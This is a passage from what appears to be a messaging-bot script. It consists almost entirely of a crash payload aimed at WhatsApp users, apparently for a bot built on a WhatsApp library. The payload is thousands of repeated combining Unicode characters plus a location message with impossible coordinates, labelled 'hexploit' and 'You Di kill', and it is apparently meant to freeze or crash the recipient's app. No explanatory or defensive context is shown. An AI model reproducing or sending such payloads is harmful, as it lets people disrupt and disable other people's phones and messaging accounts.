⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉b҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉",
              hasMediaAttachment: true,
              locationMessage: {
                degreesLatitude: -6666666666,
                degreesLongitude: 6666666666,
                name: "hexploit",
                address: "You Di kill",
              },
            },
            body: {
              text: "҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉